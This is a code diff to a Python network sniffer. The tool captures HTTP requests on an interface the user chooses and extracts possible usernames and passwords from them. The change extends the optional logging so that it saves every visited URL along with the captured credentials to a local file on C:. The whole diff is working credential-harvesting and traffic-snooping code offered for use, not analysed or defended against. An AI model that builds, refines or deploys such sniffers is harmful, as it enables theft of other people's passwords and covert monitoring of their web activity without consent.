@@ -22,24 +22,31 @@ def get_login_info(packet):
 
 
 def process_sniffed_packets(packet):
+    if y == 'Y' or y == 'y':
+        sniffed = os.path.join(r"C:\Sniffer","captured.txt")
+        if not os.path.exists(r"C:\Sniffer"):
+            os.makedirs(r"C:\Sniffer")
+
     if packet.haslayer(http.HTTPRequest):
         url = get_url(packet)
         print("[+] HTTP Request >> " + str(url))
+        if y == 'Y' or y == 'y':
+            sniffed = open(r"C:\Sniffer\captured.txt","a+")
+            sniffed.write(f"{str(url)}\n")
+            sniffed.close
 
         login_info = get_login_info(packet)
         if login_info:
             print("[+] Possible USERNAME And PASSWORD Captured")
             print("\t[x] USERNAME And PASSWORD >> " + urllib.parse.unquote(str(login_info)) + "\n\n")
-            if y == 'Y':
-                passcode = os.path.join(r"C:\Sniffer","Pass.txt")
-                if not os.path.exists(r"C:\Sniffer"):
-                    os.makedirs(r"C:\Sniffer")
-                passcode = open(r"C:\Sniffer\Pass.txt","a+")
-                passcode.write(f"{str(url)}  -  {urllib.parse.unquote(str(login_info))}\n")
-                passcode.close
+            if y == 'Y' or y == 'y':
+                sniffed = open(r"C:\Sniffer\captured.txt","a+")
+                sniffed.write(f"{str(url)}  -  {urllib.parse.unquote(str(login_info))}\n")
+                sniffed.close
+            
 
 x = input("\n[+]Enter The Interface To Sniff  - ")
 global y
-y = input("\n[+]Press Y/N To Store Captured Passwords  - ")
+y = input("\n[+]Press Y/N To Store Captured Websites And Passwords  - ")
 print(f"\n\n[+]Now Sniffing {x}\n")
 sniff(x)
